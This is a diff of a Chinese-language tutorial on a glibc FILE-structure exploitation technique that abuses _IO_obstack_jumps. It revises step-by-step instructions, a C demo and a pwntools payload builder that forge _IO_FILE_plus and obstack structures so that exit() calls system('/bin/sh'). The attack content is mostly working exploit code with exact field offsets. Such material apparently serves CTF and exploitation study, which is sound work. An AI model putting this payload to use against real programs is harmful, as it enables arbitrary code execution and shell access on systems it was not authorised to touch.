@@ -76,7 +76,7 @@ struct obstack // size = 0x58
 ### _IO_obstack_file
 
 ```C
-struct _IO_obstack_file
+struct _IO_obstack_file         // size = 0xE8
 {
     struct _IO_FILE_plus file;  // size = 0xE0
     struct obstack *obstack;    // size(*obstack) = 0x58
@@ -203,17 +203,19 @@ void _obstack_newchunk(struct obstack *h, int length)
 ## 攻击
 
 1. 在一块内存中同时伪造`_IO_FILE_plus`和`obstack`
-2. 设置`fake_IO_FILE_plus->_IO_write_ptr = 1`
-3. 设置`fake_IO_FILE_plus->_IO_write_end = 0`
-4. 设置`fake_IO_FILE_plus->vtable = _IO_obstack_jumps - 0x8 * 4`, 根据不同的函数指针可以进行微调
-5. 设置`fake_IO_obstack_file->obstack = fake_IO_obstack`, 我们重复利用空间
-6. 设置`obstack->next_free = 0`
-7. 设置`fake_obstack->chunk_limit = 0`
-8. 设置`fake_obstack->use_extra_arg = 1`
-9. 设置`fake_obstack->extra_arg = /bin/sh`地址
-10. 设置`fake_obstack->chunkfun = system`
-11. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
-12. exit时触发漏洞
+2. 设置`fake_IO_FILE_plus->_IO_write_base = 0`
+3. 设置`fake_IO_FILE_plus->_IO_write_ptr = 1`
+4. 设置`fake_IO_FILE_plus->_IO_write_end = 0`
+5. 设置`fake_IO_FILE_plus->_mode = 0`
+6. 设置`fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4`, 这是`overflow`函数的位置
+7. 设置`fake_IO_obstack_file->obstack = fake_IO_FILE_plus`, 将`fake_obstack`指向`fake_IO_FILE_plus`重复利用空间
+8. 设置`fake_obstack->next_free = 0`
+9. 设置`fake_obstack->chunk_limit = 0`
+10. 设置`fake_obstack->use_extra_arg = 1`
+11. 设置`fake_obstack->extra_arg = /bin/sh`地址
+12. 设置`fake_obstack->chunkfun = system`
+13. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
+14. `exit`时触发漏洞
 
 ## 示例
 
@@ -232,8 +234,10 @@ int main()
     u64 fake_IO_obstack = MALLOC(0x200);
 
     // 伪造_IO_obstack_file
+    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x20, 0x0); // fake_IO_FILE_plus->_IO_write_base = 0
     SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x28, 0x1); // fake_IO_FILE_plus->_IO_write_ptr = 1
     SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x30, 0x0); // fake_IO_FILE_plus->_IO_write_end = 0
+    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0xC0, 0x0); // fake_IO_FILE_plus->_mode = 0
 
     SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0xD8, _IO_obstack_jumps + 0x8 * 4); // fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4
 
@@ -260,39 +264,29 @@ int main()
 from pwn import *
 from base_data import *
 
-def HOQSPP(_IO_obstack_jumps_addr, payload_addr,  fun_addr, param = None, fun_offset = -4):
+def HOQSPP(_IO_obstack_jumps_addr, payload_addr,  fun_addr, param = None):
     '''
         _IO_obstack_jumps_addr: _IO_obstack_jumps的实际地址
         payload_addr: payload将要写入的地址
         fun_addr: 要调用的函数的实际地址
         param: 函数的参数, 默认为内置的/bin/sh地址
-        fun_offset: 函数指针与在_IO_obstack_jumps->xsputn的偏移, 默认是overflow函数与xsputn的偏移, exit就可以触发漏洞
     '''
     if param is None:
         param = payload_addr + 0x40
     
     payload = b''
     payload = set_value(payload, 0x18, 0x0);                                          # fake_obstack->next_free = 0
-    payload = set_value(payload, 0x20, 0x0);                                          # fake_obstack->chunk_limit = 0
+    payload = set_value(payload, 0x20, 0x0);                                          # fake_obstack->chunk_limit = 0, fake_IO_FILE_plus->_IO_write_base = 0
     payload = set_value(payload, 0x28, 0x1);                                          # fake_IO_FILE_plus->_IO_write_ptr = 1
     payload = set_value(payload, 0x30, 0x0);                                          # fake_IO_FILE_plus->_IO_write_end = 0
     payload = set_value(payload, 0x38, fun_addr);                                     # fake_obstack->chunkfun = system
-    payload = set_value(payload, 0x40, BINSH);                                        # /bin/sh字符串值
     payload = set_value(payload, 0x48, param);                                        # fake_obstack->extra_arg = /bin/sh地址
     payload = set_value(payload, 0x50, 0xFFFFFFFFFFFFFFFF);                           # fake_obstack->use_extra_arg = 1
-    payload = set_value(payload, 0xD8, _IO_obstack_jumps_addr + 0x8 * (-fun_offset)); # fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4
+    payload = set_value(payload, 0xC0, 0x0);                                          # fake_IO_FILE_plus->_mode = 0
+    payload = set_value(payload, 0xD8, _IO_obstack_jumps_addr + 0x8 * 4);             # fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4
     payload = set_value(payload, 0xE0, payload_addr);                                 # fake_IO_obstack_file->obstack = fake_IO_obstack, 我们重复利用空间
     
+    payload = set_value(payload, 0x40, BINSH);                                        # 内置/bin/sh字符串值
+    
     return payload
-
-if __name__ == '__main__':
-    p = process('./demo')
-    
-    _IO_obstack_jumps_addr = int(p.recv(14), 16)
-    system_addr = int(p.recv(14), 16)
-    fake_addr = int(p.recv(14), 16)
-    
-    p.send(HOQSPP(_IO_obstack_jumps_addr, fake_addr, system_addr))
-    
-    p.interactive()
 ```
